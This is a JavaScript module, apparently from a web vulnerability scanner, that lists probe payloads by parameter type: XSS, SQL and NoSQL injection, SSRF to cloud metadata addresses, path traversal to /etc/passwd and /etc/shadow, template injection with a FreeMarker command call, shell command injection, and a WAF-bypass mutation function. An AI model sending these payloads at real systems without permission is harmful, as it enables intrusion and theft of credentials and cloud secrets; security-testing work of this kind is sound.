// engine/scanner/payload-engine.js
// ── Extended payload library với SSRF, Path Traversal, SSTI, NoSQLi, Cmd Injection

const PAYLOAD_DICTIONARY = {

  // ── XSS (text params) ────────────────────────────────────────────────────
  text: [
    "<script>alert('SNTL')</script>",
    "\"><script>alert('SNTL')</script>",
    "<img src=x onerror=alert('SNTL')>",
    "javascript:alert('SNTL')",
    "'-alert('SNTL')-'",
    // Polyglot (bypass many WAFs)
    "'\"><img/src=x onerror=alert`SNTL`>",
    // DOM-based
    "#<script>alert('SNTL')</script>",
    // SVG
    "<svg onload=alert('SNTL')>",
  ],

  // ── SQL Injection (number params) ────────────────────────────────────────
  number: [
    "' OR 1=1--",
    "' AND 1=0--",
    "' OR SLEEP(3)--",           // MySQL time-based
    "'; WAITFOR DELAY '0:0:3'--",// MSSQL time-based
    "1 AND SLEEP(3)",
    "-1 OR 1=1",
    "' OR '1'='1",
    "1; SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    // PostgreSQL
    "'; SELECT pg_sleep(3)--",
  ],

  // ── Open Redirect + SSRF (url params) ────────────────────────────────────
  url: [
    // Open Redirect
    "https://evil.example.com",
    "//evil.example.com",
    "\\/evil.example.com",
    "https://google.com%2F..",
    // SSRF — cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/", // Alibaba Cloud
    // SSRF — internal
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    // SSRF encoded
    "http://0177.0000.0000.0001",  // 127.0.0.1 octal
    "http://2130706433",           // 127.0.0.1 decimal
  ],

  // ── Path Traversal (file/path params) ────────────────────────────────────
  path: [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../web.config",
    "../../../boot.ini",
    // URL-encoded traversal
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd", // double encoded
    // Null byte bypass
    "../../../../etc/passwd%00",
    // Windows
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  ],

  // ── Server-Side Template Injection (template-like params) ────────────────
  template: [
    // Generic SSTI probes
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "#{7*7}",
    // Jinja2 / Twig
    "{{7*'7'}}",
    "{{config}}",
    // Velocity
    "#set($x=7*7)${x}",
    // FreeMarker
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
  ],

  // ── Command Injection (cmd/exec-like params) ──────────────────────────────
  cmd: [
    "; ls",
    "| id",
    "` id `",
    "$(id)",
    "; cat /etc/passwd",
    "& dir",
    "|| id",
    "\n/usr/bin/id\n",
    // Windows
    "& whoami",
    "; whoami",
  ],

  // ── NoSQL Injection (JSON-body, MongoDB-style) ────────────────────────────
  nosql: [
    '{"$gt":""}',
    '{"$ne":null}',
    '{"$regex":".*"}',
    '{"$where":"this.username==this.username"}',
  ],

  // ── Email params ──────────────────────────────────────────────────────────
  email: [
    "test@evil.example.com",
    "admin' OR 1=1--@example.com",
  ],

  // ── Fallback ──────────────────────────────────────────────────────────────
  unknown: [
    "'",
    "\"",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "../../../../etc/passwd",
  ],
};

/**
 * Mutate payload to bypass simple WAF filters
 * - Alternate casing, URL encoding, double URL encoding
 * - HTML entity encoding (for XSS)
 */
function mutatePayload(payload) {
  const mutations = new Set([payload]);

  // Alt casing
  let altCase = '';
  for (let i = 0; i < payload.length; i++) {
    altCase += (i % 2 === 0) ? payload[i].toUpperCase() : payload[i].toLowerCase();
  }
  mutations.add(altCase);

  // URL encode
  mutations.add(encodeURIComponent(payload));

  // Double URL encode
  mutations.add(encodeURIComponent(encodeURIComponent(payload)));

  return Array.from(mutations);
}

/**
 * Return payloads for given param type.
 * @param {string} type  - 'text' | 'number' | 'url' | 'path' | 'template' | 'cmd' | 'nosql' | 'email' | 'unknown'
 * @param {boolean} useMutations - whether to add WAF-bypass mutations
 */
function getPayloadsByType(type = 'unknown', useMutations = false) {
  const baseList = PAYLOAD_DICTIONARY[type.toLowerCase()] || PAYLOAD_DICTIONARY.unknown;
  if (!useMutations) return [...baseList];

  const out = [];
  for (const p of baseList) out.push(...mutatePayload(p));
  return out;
}

module.exports = { getPayloadsByType, mutatePayload, PAYLOAD_DICTIONARY };
